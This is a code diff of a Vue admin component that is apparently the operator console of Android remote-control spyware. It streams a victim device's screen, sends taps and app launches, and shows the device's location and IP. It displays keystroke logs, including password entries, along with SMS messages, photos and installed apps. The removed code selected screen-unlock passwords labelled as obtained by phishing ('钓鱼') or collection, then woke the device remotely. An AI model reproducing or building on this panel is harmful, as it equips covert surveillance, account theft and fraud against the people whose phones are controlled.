@@ -1,39 +1,19 @@
 <template>
-  <el-dialog
-    v-model="detailDialogVisible"
-    :width="isPageMode ? '100%' : '1200px'"
-    :top="isPageMode ? '0' : '2vh'"
-    :fullscreen="isPageMode"
-    :modal="!isPageMode"
-    :show-close="!isPageMode"
-    :close-on-click-modal="false"
-    :teleport="!isPageMode"
-    @close="onClose"
-    :class="['device-detail-dialog', { 'is-page': isPageMode }]"
-    custom-class="device-detail-dialog"
-  >
+  <el-dialog v-model="detailDialogVisible" width="1200px" top="2vh" @close="hide" :close-on-click-modal="false"
+    class="device-detail-dialog" custom-class="device-detail-dialog">
 
     <template #header>
-        <div class="dialog-header">
-          <div class="dialog-title">
-            <div class="device-meta">
-            <el-tag size="small" effect="light" type="info">设备ID: {{ deviceId || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">当前位置: {{ screenInfo?.appName || "未知" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">包名: {{ device?.pkg || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">品牌/型号: {{ [device?.brand, device?.model].filter(Boolean).join(" ") || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">系统/SDK: {{ device?.systemVersion || "-" }} / {{ device?.sdkVersion ?? "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">分辨率: {{ device?.screenWidth || "-" }}×{{ device?.screenHeight || "-" }}</el-tag>
-            <el-tag size="small" effect="light" type="info">城市/IP: {{ device?.addr || "-" }} / {{ device?.ip || "-" }}</el-tag>
-
-            <el-tag size="small" effect="light" :type="screenStatusTagType">屏幕: {{ screenStatusText }}</el-tag>
-
-            <el-tooltip v-if="device?.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(device.lockScreen)" placement="top" :show-after="300">
-              <el-tag size="small" effect="light" type="success">可解锁</el-tag>
-            </el-tooltip>
-            <el-tag v-else size="small" effect="light" type="danger">不可解锁</el-tag>
-          </div>
-        </div>
+      <div class="dialog-header">
+        <div class="dialog-title">设备ID: {{ deviceId }} -- 当前位置:{{ `${screenInfo.appName}` }}</div>
       </div>
+
+    <!-- 快捷操作按钮区域 -->
+    <div class="quick-actions">
+      <el-button type="primary" size="small" @click="showInputLogDialog">输入记录</el-button>
+      <el-button type="primary" size="small" @click="showAppListDialog">安装应用</el-button>
+      <el-button type="primary" size="small" @click="showSmsListDialog">短信记录</el-button>
+      <el-button type="primary" size="small" @click="showAlbumListDialog">查看相册</el-button>
+    </div>
     </template>
 
 
@@ -150,28 +130,7 @@
           <el-button type="success" @click="rollSwitch" size="small">滑动模式</el-button>
         </el-col> -->
             <el-col :span="4">
-              <el-popover
-                v-model:visible="unlockPopoverVisible"
-                trigger="click"
-                placement="bottom"
-                :width="420"
-                :teleported="false"
-              >
-                <template #reference>
-                  <el-button type="success" @click="wakeup" size="small">唤醒重连</el-button>
-                </template>
-
-                <div class="unlock-popover">
-                  <div class="unlock-popover-title">选择解锁密码</div>
-                  <el-select v-model="selectedUnlockId" placeholder="请选择解锁密码" filterable style="width: 100%">
-                    <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)" :value="item.id" />
-                  </el-select>
-                  <div class="unlock-popover-actions">
-                    <el-button size="small" @click="unlockPopoverVisible = false">取消</el-button>
-                    <el-button size="small" type="primary" :loading="unlocking" :disabled="!selectedUnlockId" @click="confirmWakeup">确定</el-button>
-                  </div>
-                </div>
-              </el-popover>
+              <el-button type="success" @click="wakeup" size="small">唤醒重连</el-button>
             </el-col>
             <el-col :span="4">
               <el-button type="success" @click="screenReq" size="small">刷新</el-button>
@@ -224,76 +183,6 @@
             </div>
           </div>
         </div>
-      </div>
-
-      <!-- 右侧工具区：用 Tabs 承载 输入记录/安装应用/短信记录/查看相册 -->
-      <div class="tools-panel">
-        <el-tabs v-model="toolsTab" type="border-card" class="tools-tabs">
-          <el-tab-pane label="输入记录" name="input">
-            <div class="tools-tab-body">
-              <div class="log-header">
-                <div class="header-row">
-                  <div class="query-controls tools-query-controls">
-                    <span class="query-label">来源:</span>
-                    <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px">
-                      <el-option label="管理端" :value="1" />
-                      <el-option label="App端" :value="0" />
-                    </el-select>
-                    <span class="query-label">APP包名:</span>
-                    <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
-                    <span class="query-label">查询日期:</span>
-                    <el-date-picker
-                      v-model="queryDate"
-                      type="daterange"
-                      range-separator="至"
-                      start-placeholder="开始日期"
-                      end-placeholder="结束日期"
-                      format="YYYY-MM-DD"
-                      value-format="YYYY-MM-DD"
-                      @change="onDateChange"
-                      style="width: 280px"
-                    />
-                    <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small" :disabled="!deviceId">重新查询</el-button>
-                  </div>
-                </div>
-              </div>
-
-              <div class="log-content tools-log-content" v-loading="logLoading">
-                <div v-if="!deviceId" class="no-data">请先连接设备</div>
-                <template v-else>
-                  <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
-                    <div class="log-content-row">
-                      <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
-                      <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">{{ item.source == 1 ? "管理端" : "App端" }}</span>
-                      <span class="log-app">{{ item.app }}</span>
-                      <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
-                      <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
-                    </div>
-                  </div>
-                  <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">暂无输入日志数据</div>
-                </template>
-              </div>
-            </div>
-          </el-tab-pane>
-
-          <el-tab-pane label="安装应用" name="apps">
-            <div class="tools-tab-body">
-              <AppList :device-id="deviceId" />
-            </div>
-          </el-tab-pane>
-
-          <el-tab-pane label="短信记录" name="sms">
-            <div class="tools-tab-body">
-              <SmsList :device-id="deviceId" />
-            </div>
-          </el-tab-pane>
-
-          <el-tab-pane label="查看相册" name="album">
-            <div class="tools-tab-body">
-              <AlbumList :device-id="deviceId" />
-            </div>
-          </el-tab-pane>
-        </el-tabs>
       </div>
     </div>
   </el-dialog>
@@ -398,10 +287,59 @@
     </template>
   </el-dialog>
 
+  <!-- 输入记录弹窗 -->
+  <el-dialog v-model="inputLogDialogVisible" :title="`输入日志 - 设备ID: ${deviceId}`" width="970px" :close-on-click-modal="false" class="input-log-dialog" destroy-on-close>
+    <div class="log-header">
+      <div class="header-row">
+        <div class="query-controls">
+          <span class="query-label">来源:</span>
+          <el-select v-model="querySource" placeholder="选择来源" clearable style="width: 120px">
+            <el-option label="管理端" :value="1" />
+            <el-option label="App端" :value="0" />
+          </el-select>
+          <span class="query-label">APP包名:</span>
+          <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
+          <span class="query-label">查询日期:</span>
+          <el-date-picker v-model="queryDate" type="daterange" range-separator="至" start-placeholder="开始日期" end-placeholder="结束日期" format="YYYY-MM-DD" value-format="YYYY-MM-DD" @change="onDateChange" style="width: 280px" />
+          <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">重新查询</el-button>
+        </div>
+      </div>
+    </div>
+    <div class="log-content" v-loading="logLoading">
+      <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
+        <div class="log-content-row">
+          <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
+          <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">{{ item.source == 1 ? "管理端" : "App端" }}</span>
+          <span class="log-app">{{ item.app }}</span>
+          <span class="log-resource" v-if="item.resourceId">{{ item.resourceId }}</span>
+          <span class="log-text">{{ item.text || (item.password == 1 ? "[密码输入]" : "无内容") }}</span>
+        </div>
+      </div>
+      <div v-if="inputLogList.length === 0 && !logLoading" class="no-data">暂无输入日志数据</div>
+    </div>
+    <template #footer>
+      <el-button @click="inputLogDialogVisible = false">关闭</el-button>
+    </template>
+  </el-dialog>
+
+  <!-- 安装应用弹窗 -->
+  <el-dialog v-model="appListDialogVisible" :title="`安装应用列表 - 设备ID: ${deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
+    <AppList :device-id="deviceId" />
+  </el-dialog>
+
+  <!-- 短信记录弹窗 -->
+  <el-dialog v-model="smsListDialogVisible" :title="`短信记录 - 设备ID: ${deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
+    <SmsList :device-id="deviceId" />
+  </el-dialog>
+
+  <!-- 相册列表弹窗 -->
+  <el-dialog v-model="albumListDialogVisible" :title="`相册列表 - 设备ID: ${deviceId}`" width="1200px" :close-on-click-modal="false" destroy-on-close>
+    <AlbumList :device-id="deviceId" />
+  </el-dialog>
 </template>
 
 <script lang="ts">
-import { defineComponent, ref, nextTick, onUnmounted, watch, computed, onMounted } from "vue";
+import { defineComponent, ref, nextTick, onUnmounted, watch } from "vue";
 import { encodeWsMessage, decodeWsMessage, MessageType, App, encodeWsMessageNotBody } from "@/utils/message";
 import { WebSocketClient, ROOM_EVENT_CLIENT_JOINED, ROOM_EVENT_CLIENT_LEFT, ROOM_EVENT_CLIENT_ERROR, ROOM_EVENT_ROOM_MEMBER_COUNT } from "@/utils/websocket-client";
 import { ElNotification, ElMessage } from "element-plus";
@@ -411,7 +349,6 @@ import longpress from '@/directives/longpress';
 import AppList from "@/views/apps/list.vue";
 import SmsList from "@/views/sms/list.vue";
 import AlbumList from "@/views/album/list.vue";
-import { useRoute } from "vue-router";
 export default defineComponent({
   props: {},
   components: {
@@ -422,18 +359,8 @@ export default defineComponent({
   directives: {
     longpress
   },
-  setup() {
-    const toolsTab = ref("input");
-    const route = useRoute();
-    const isPageMode = computed(() => String(route.query.page || "") === "1");
-    const pageKey = computed(() => String(route.query.key || ""));
-
+  setup(propers, { emit }) {
     const detailDialogVisible = ref(false);
-    const deviceBaseLoading = ref(false);
-    const unlockPopoverVisible = ref(false);
-    const unlockOptions = ref<any[]>([]);
-    const selectedUnlockId = ref<any>(null);
-    const unlocking = ref(false);
     const scrollDialogVisible = ref(false);
     const inputDialogVisible = ref(false);
     const widgetSelectDialogVisible = ref(false);
@@ -478,6 +405,10 @@ export default defineComponent({
     let historyInput = [];
 
     // 快捷操作弹窗相关
+    const inputLogDialogVisible = ref(false);
+    const appListDialogVisible = ref(false);
+    const smsListDialogVisible = ref(false);
+    const albumListDialogVisible = ref(false);
     const logLoading = ref(false);
     const inputLogList = ref([]);
     const queryDate = ref<any>([]);
@@ -532,31 +463,6 @@ export default defineComponent({
       screenHeight: 800
     });
     let wsClient: WebSocketClient | null = null;
-
-    const fetchDeviceBaseInfo = async () => {
-      if (!deviceId.value) return;
-      deviceBaseLoading.value = true;
-      try {
-        const { code, data, msg } = await baseService.post("https://admin.astzh.network/ast/device/page", {
-          deviceId: deviceId.value,
-          page: 1,
-          limit: 1
-        });
-        if (code != 0) {
-          ElMessage.error(msg || "获取设备信息失败");
-          return;
-        }
-        const list = (data && (data.list || data.records)) || [];
-        const info = Array.isArray(list) ? list[0] : null;
-        if (info) {
-          device.value = { ...(device.value as any), ...(info as any) };
-        }
-      } catch (e) {
-        ElMessage.error("获取设备信息失败");
-      } finally {
-        deviceBaseLoading.value = false;
-      }
-    };
 
     // 信号强度（基于最近一次收到的 screen_info 时间）
     const lastScreenInfoTime = ref(0);
@@ -666,9 +572,6 @@ export default defineComponent({
           onConnect: () => {
             console.log("WebSocket连接成功");
             addLog("success", `WebSocket connected to device ${_deviceId}`, "connection");
-            // 连接成功后，优先认为已亮屏（后续由 block/screen_info 修正）
-            (device.value as any).status = 1;
-            fetchDeviceBaseInfo();
             // 连接成功后发送设备上线消息
             if (wsClient) {
               const monitorOnlineMsg = encodeWsMessage(MessageType.monitor_online, { deviceId: _deviceId });
@@ -690,10 +593,8 @@ export default defineComponent({
                 if (block.value != screenInfoData.block) {
                   if (screenInfoData.block) {
                     addLog("info", `进入息屏模式`, "screen");
-                    (device.value as any).status = 0;
                   } else {
                     addLog("info", `退出息屏模式`, "screen");
-                    (device.value as any).status = 1;
                   }
                 }
                 block.value = screenInfoData.block;
@@ -803,7 +704,6 @@ export default defineComponent({
       detailDialogVisible.value = true;
       deviceId.value = _device.deviceId;
       device.value = _device;
-      fetchDeviceBaseInfo();
       screenInfo.value.items = [];
       // 仅按高度进行缩放：高度固定为 600px，宽度固定 450px
       const desiredHeight = 650; // 高度目标
@@ -832,133 +732,6 @@ export default defineComponent({
       lastCanvasHeight = 0;
     };
 
-    const wakeup = async () => {
-      // 获取解锁密码列表（与 list copy.vue 保持一致）
-      const deviceDbId = (device.value as any)?.id;
-      if (!deviceDbId) {
-        ElMessage.warning("设备信息不完整，无法唤醒");
-        return;
-      }
-      const { success, data, msg } = await baseService.post("/unlockScreenPwd/page", {
-        deviceId: deviceDbId,
-        page: 1,
-        limit: 100
-      });
-      if (!success) {
-        ElMessage.error(msg);
-        return;
-      }
-      const list = Array.isArray(data) ? data : (data && (data.list || data.records)) || [];
-      unlockOptions.value = list || [];
-      if (!unlockOptions.value || unlockOptions.value.length === 0) {
-        ElMessage.warning("暂无可选解锁密码，请先添加");
-        return;
-      }
-      selectedUnlockId.value = unlockOptions.value[0]?.id || null;
-      unlockPopoverVisible.value = true;
-    };
-
-    const confirmWakeup = async () => {
-      const deviceDbId = (device.value as any)?.id;
-      if (!deviceDbId || !selectedUnlockId.value) {
-        ElMessage.warning("请选择解锁密码");
-        return;
-      }
-      unlocking.value = true;
-      try {
-        const { code, msg } = await baseService.post("/device/wakeup", {
-          id: deviceDbId,
-          unlockPwdId: selectedUnlockId.value
-        });
-        if (code == 0) {
-          ElMessage.success("操作成功,等待唤醒!");
-          addLog("success", "唤醒请求已发送，准备重连...", "system");
-          unlockPopoverVisible.value = false;
-
-          // 更新本地状态（可选）
-          (device.value as any).status = 2;
-          fetchDeviceBaseInfo();
-
-          // 主动断开并重连
-          if (wsClient) {
-            closed.value = true;
-            wsClient.disconnect();
-            wsClient = null;
-          }
-          closed.value = false;
-          if (deviceId.value) {
-            connect(deviceId.value);
-          }
-        } else {
-          ElMessage.error(msg || "唤醒失败");
-        }
-      } finally {
-        unlocking.value = false;
-      }
-    };
-
-    // 顶部实时“屏幕状态”：优先依据 block + 最近 screen_info 时间推断，兜底用 device.status
-    const screenStatus = computed(() => {
-      if (block.value) return 0;
-      const now = Date.now();
-      const diff = lastScreenInfoTime.value ? now - lastScreenInfoTime.value : Number.POSITIVE_INFINITY;
-      if (diff < 15000) return 1;
-      return (device.value as any)?.status;
-    });
-    const screenStatusText = computed(() => {
-      return screenStatus.value == 1
-        ? "亮屏"
-        : screenStatus.value == 0
-          ? "熄屏"
-          : screenStatus.value == 2 || screenStatus.value == 3
-            ? "等待唤醒"
-            : "未知";
-    });
-    const screenStatusTagType = computed(() => {
-      return screenStatus.value == 1 ? "success" : screenStatus.value == 0 ? "info" : screenStatus.value == 2 || screenStatus.value == 3 ? "warning" : "info";
-    });
-
-    const formatUnlockTips = (lockScreen: any) => {
-      if (!lockScreen) return "未知";
-      let type = "";
-      switch (lockScreen.type) {
-        case 0:
-          return "无锁";
-        case 1:
-          type = "PIN码";
-          break;
-        case 2:
-          type = "手势";
-          break;
-        case 3:
-          type = "混合密码";
-          break;
-        default:
-          return "未知";
-      }
-
-      let source = "";
-      switch (lockScreen.source) {
-        case 1:
-          source = "钓鱼";
-          break;
-        case 2:
-          source = "采集";
-          break;
-        default:
-          source = "未知";
-          break;
-      }
-      return `(${source}) - ${type}:${lockScreen.tips || ""}`;
-    };
-
-    const onClose = () => {
-      // 页面模式不允许“关闭弹窗”，避免误触导致断连
-      if (!isPageMode.value) {
-        hide();
-      }
-    };
-
     onUnmounted(() => {
       if (signalTimer) {
         clearInterval(signalTimer);
@@ -970,24 +743,6 @@ export default defineComponent({
       lastCanvasHeight = 0;
     });
 
-    onMounted(() => {
-      if (isPageMode.value) {
-        // 页面模式：自动读取 sessionStorage 的设备信息并打开
-        const key = pageKey.value;
-        if (key) {
-          const raw = sessionStorage.getItem(key);
-          if (raw) {
-            try {
-              const device = JSON.parse(raw);
-              show(device);
-            } catch (e) {
-              // ignore
-            }
-          }
-        }
-      }
-    });
-
     // 屏幕容器引用
     const screenRef = ref<HTMLElement>();
     const screenshotCanvas = ref<HTMLCanvasElement>();
@@ -996,7 +751,7 @@ export default defineComponent({
     let cachedCanvasContext: CanvasRenderingContext2D | null = null;
     let lastCanvasWidth = 0;
     let lastCanvasHeight = 0;
-
+    
     // 绘制截图到 Canvas（高性能防闪烁版本）
     const drawScreenshot = async (
       binaryData: Uint8Array | ArrayBuffer,
@@ -1011,7 +766,7 @@ export default defineComponent({
         const canvas = screenshotCanvas.value;
         const targetWidth = device.value.screenWidth;
         const targetHeight = device.value.screenHeight;
-
+        
         // 只在尺寸真正改变时才更新 canvas 尺寸（避免不必要的重置导致闪烁）
         if (canvas.width !== targetWidth || canvas.height !== targetHeight) {
           canvas.width = targetWidth;
@@ -1024,13 +779,13 @@ export default defineComponent({
 
         // 获取或使用缓存的绘图上下文
         if (!cachedCanvasContext) {
-          cachedCanvasContext = canvas.getContext('2d', {
+          cachedCanvasContext = canvas.getContext('2d', { 
             alpha: true,  // 支持透明度（处理透明图片）
             desynchronized: true,  // 允许异步渲染，提高性能
             willReadFrequently: false  // 不会频繁读取像素，优化写入性能
           });
         }
-
+        
         const ctx = cachedCanvasContext;
         if (!ctx) {
           throw new Error('无法获取 Canvas 上下文');
@@ -1039,7 +794,7 @@ export default defineComponent({
         // 使用 ImageBitmap API（最快）
         try {
           const blob = new Blob([binaryData as any], { type: `image/${mimeType}` });
-
+          
           // createImageBitmap 直接解码并缩放到目标尺寸
           const imageBitmap = await createImageBitmap(blob, {
             resizeWidth: targetWidth,
@@ -1058,17 +813,17 @@ export default defineComponent({
               resolve();
             });
           });
-
+          
         } catch (imageBitmapError) {
           // 降级方案：使用传统 Image 对象
           console.warn('ImageBitmap 失败，使用降级方案:', imageBitmapError);
-
+          
           const blob = new Blob([binaryData as any], { type: `image/${mimeType}` });
           const url = URL.createObjectURL(blob);
 
           try {
             const img = new Image();
-
+            
             await new Promise<void>((resolve, reject) => {
               img.onload = () => {
                 // 同样使用 requestAnimationFrame 避免闪烁
@@ -1081,12 +836,12 @@ export default defineComponent({
                   resolve();
                 });
               };
-
+              
               img.onerror = () => {
                 URL.revokeObjectURL(url);
                 reject(new Error('图片加载失败'));
               };
-
+              
               img.src = url;
             });
           } catch (error) {
@@ -1104,7 +859,7 @@ export default defineComponent({
     };
 
     // 全局点击处理器 - 发送真实鼠标点击位置
-    const handleGlobalClick = (event: MouseEvent, hold = false) => {
+    const handleGlobalClick = (event: MouseEvent, hold: boolean = false) => {
       if (!wsClient || !screenRef.value) return;
 
       // 如果正在滚动模式，不处理点击 TODO: 需要优化
@@ -1146,7 +901,7 @@ export default defineComponent({
     };
 
     // 检测与指定控件重叠的所有控件
-    const getOverlappingWidgets = (targetItem: any, hold = false): any[] => {
+    const getOverlappingWidgets = (targetItem: any, hold: boolean = false): any[] => {
       if (!screenInfo.value.items || screenInfo.value.items.length === 0) {
         return [];
       }
@@ -1269,7 +1024,7 @@ export default defineComponent({
       }
     };
     // 保留原有的点击方法作为备用（用于特殊情况）
-    const click = (item: any, hold = false) => {
+    const click = (item: any, hold: boolean = false) => {
       if (!block.value) {
         return;
       }
@@ -1500,6 +1255,10 @@ export default defineComponent({
       }
       addLog("info", `已发送指令: start_app_req `, "click");
     };
+    const wakeup = () => {
+      emit("wakeup", device.value);
+    };
+
     // 切换到指定页面
     const switchToPage = (targetItem: any) => {
       if (wsClient) {
@@ -1514,6 +1273,32 @@ export default defineComponent({
         addLog("info", `已发送指令: switchToPage `, "click");
       }
     };
+
+    // 快捷操作方法
+    const showInputLogDialog = () => {
+      // 设置默认查询日期为今天（范围）
+      const today = new Date();
+      const todayStr = today.getFullYear() + "-" + String(today.getMonth() + 1).padStart(2, "0") + "-" + String(today.getDate()).padStart(2, "0");
+      queryDate.value = [todayStr, todayStr];
+      queryAppPkg.value = "";
+      querySource.value = null;
+      inputLogList.value = [];
+      inputLogDialogVisible.value = true;
+      refreshLog();
+    };
+
+    const showAppListDialog = () => {
+      appListDialogVisible.value = true;
+    };
+
+    const showSmsListDialog = () => {
+      smsListDialogVisible.value = true;
+    };
+
+    const showAlbumListDialog = () => {
+      albumListDialogVisible.value = true;
+    };
+
     const refreshLog = async () => {
       if (!deviceId.value || !queryDate.value || !Array.isArray(queryDate.value) || queryDate.value.length !== 2) {
         ElMessage({
@@ -1586,7 +1371,6 @@ export default defineComponent({
 
     return {
       wakeup,
-      confirmWakeup,
       startAppReq,
       startApp,
       installAppList,
@@ -1605,17 +1389,10 @@ export default defineComponent({
       recents,
       home,
       detailDialogVisible,
-      unlockPopoverVisible,
-      unlockOptions,
-      selectedUnlockId,
-      unlocking,
       scrollDialogVisible,
       deviceId,
       show,
       hide,
-      onClose,
-      isPageMode,
-      formatUnlockTips,
       connect,
       screenInfo,
       click,
@@ -1653,11 +1430,15 @@ export default defineComponent({
       selectWidget,
       cancelWidgetSelect,
       screenMode,
-      toolsTab,
-      deviceBaseLoading,
-      fetchDeviceBaseInfo,
-      screenStatusText,
-      screenStatusTagType,
+      // 快捷操作相关
+      inputLogDialogVisible,
+      appListDialogVisible,
+      smsListDialogVisible,
+      albumListDialogVisible,
+      showInputLogDialog,
+      showAppListDialog,
+      showSmsListDialog,
+      showAlbumListDialog,
       logLoading,
       inputLogList,
       queryDate,
@@ -1673,6 +1454,30 @@ export default defineComponent({
 
 <style>
 /* 旧样式已移除，使用下方的新样式 */
+
+/* 快捷操作按钮区域样式 */
+.quick-actions {
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 16px;
+  background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+  border-bottom: 2px solid #e5e7eb;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+}
+
+.quick-actions .el-button {
+  border-radius: 8px;
+  font-weight: 500;
+  transition: all 0.3s ease;
+  box-shadow: 0 2px 6px rgba(59, 130, 246, 0.15);
+}
+
+.quick-actions .el-button:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
+}
 
 /* 输入日志弹窗样式（复用 list.vue 的样式） */
 .input-log-dialog .el-dialog__body {
@@ -2486,34 +2291,6 @@ export default defineComponent({
   width: 100%;
 }
 
-/* 右侧 Tab 工具区（红框区域） */
-.tools-panel {
-  flex: 1;
-  min-width: 360px;
-  height: 100%;
-}
-
-.tools-tabs {
-  height: 100%;
-}
-
-.tools-tabs :deep(.el-tabs__content) {
-  padding: 12px;
-}
-
-.tools-tab-body {
-  height: calc(100vh - 220px);
-  overflow: auto;
-}
-
-.tools-query-controls {
-  flex-wrap: wrap;
-}
-
-.tools-log-content {
-  max-height: none;
-}
-
 .dialog-header {
   width: 100%;
   display: flex;
@@ -2528,49 +2305,6 @@ export default defineComponent({
   font-size: 18px;
   font-weight: 600;
   color: #040404;
-}
-
-.dialog-title-main {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 12px;
-}
-
-.device-id {
-  font-weight: 700;
-}
-
-.device-loc {
-  font-weight: 500;
-  color: #606266;
-  white-space: nowrap;
-}
-
-.device-meta {
-  margin-top: 8px;
-  display: flex;
-  flex-wrap: wrap;
-  gap: 8px;
-  align-items: center;
-  justify-content: center;
-}
-
-.unlock-popover {
-  display: flex;
-  flex-direction: column;
-  gap: 10px;
-}
-
-.unlock-popover-title {
-  font-weight: 600;
-  color: #303133;
-}
-
-.unlock-popover-actions {
-  display: flex;
-  justify-content: flex-end;
-  gap: 8px;
 }
 
 /* 左侧设备控制面板 */
@@ -3002,14 +2736,6 @@ export default defineComponent({
 .device-detail-dialog .el-dialog__body {
   min-height: 800px !important;
   overflow-y: auto;
-}
-
-/* 页面模式（在新Tab里显示时）让对话框像页面一样铺满且无边距 */
-.device-detail-dialog.is-page :deep(.el-dialog) {
-  margin: 0 !important;
-  border-radius: 0 !important;
-  width: 100% !important;
-  max-width: none !important;
 }
 
 .scroll-dialog-modal {
